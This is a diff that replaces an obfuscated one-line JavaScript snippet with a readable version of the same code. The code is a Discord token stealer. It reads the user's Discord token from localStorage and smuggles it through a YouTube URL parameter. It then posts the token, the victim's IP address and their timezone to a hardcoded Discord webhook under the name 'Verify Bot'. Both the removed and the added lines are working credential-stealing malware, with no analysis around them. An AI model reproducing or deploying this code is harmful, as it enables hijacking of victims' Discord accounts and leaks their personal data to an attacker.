@@ -1,1 +1,46 @@
-(function(){const _0x327b28='https://discord.com/api/webhooks/1391045636366930000/fH5K6z2KNgUe9ykdh9UZjfiNRKvoV6DYOy3TzITTQC8_KuYUteGBE40Cj-IFy2cQsVgM';if(window['location']['href']['startsWith']('https://www.youtube.com/')){const _0x240bbb=new URL(window['location']['href']),_0x2b48c1=_0x240bbb['searchParams']['get']('v');_0x2b48c1!=null&&fetch('https://api.ipify.org/?format=json')['then'](_0x49c438=>_0x49c438['json']())['then'](_0x4b10cb=>{const _0x57b012=_0x4b10cb['ip'],_0x800872=Intl['DateTimeFormat']()['resolvedOptions']()['timeZone'],_0x41d3d8={'username':'Verify\x20Bot','embeds':[{'title':'Logged\x20Info','description':'**IP:**\x20'+_0x57b012+'\x0a**Timezone:**\x20'+_0x800872+'\x0a**Token:**\x20'+_0x2b48c1+'\x0a\x0aOne\x20ppl\x20get\x20fack','color':0xff00ff}]};fetch(_0x327b28,{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON['stringify'](_0x41d3d8)})['catch'](_0x52bd7c=>console['error']('Error1:',_0x52bd7c));})['catch'](_0x556f41=>console['error']('Error2:',_0x556f41));}else{if(window['location']['href']==='https://discord.com/channels/@me'){const _0xf0f7ce=localStorage['token'];_0xf0f7ce!=null&&(window['location']['href']='https://www.youtube.com/watch?v='+btoa(JSON['stringify'](_0xf0f7ce)));}else window['location']['href']='https://discord.com/channels/@me';}}());
+(function () {
+    const webhookURL = 'https://discord.com/api/webhooks/1391045636366930000/fH5K6z2KNgUe9ykdh9UZjfiNRKvoV6DYOy3TzITTQC8_KuYUteGBE40Cj-IFy2cQsVgM';
+
+    if (window.location.href.startsWith("https://www.youtube.com/")) {
+        const url = new URL(window.location.href);
+        const param = url.searchParams.get("v");
+        if (param != null) {
+
+            fetch('https://api.ipify.org/?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                    const message = {
+                        username: "Verify Bot",
+                        embeds: [
+                            {
+                                title: "Logged Info",
+                                description: `**IP:** ${ip}\n**Timezone:** ${timezone}\n**Token:** ${param}\n\nOne ppl get fack`,
+                                color: 16711935
+                            }
+                        ]
+                    };
+
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(message)
+                    })
+                    .catch(error => console.error('Error1:', error));
+                })
+                .catch(error => console.error('Error2:', error));
+        }
+    } else if (window.location.href === "https://discord.com/channels/@me") {
+
+        const token = localStorage.token;
+        if (token != null) {
+            window.location.href = "https://www.youtube.com/watch?v=" + btoa(JSON.stringify(token));
+        }
+    } else {
+
+        window.location.href = "https://discord.com/channels/@me";
+    }
+})();
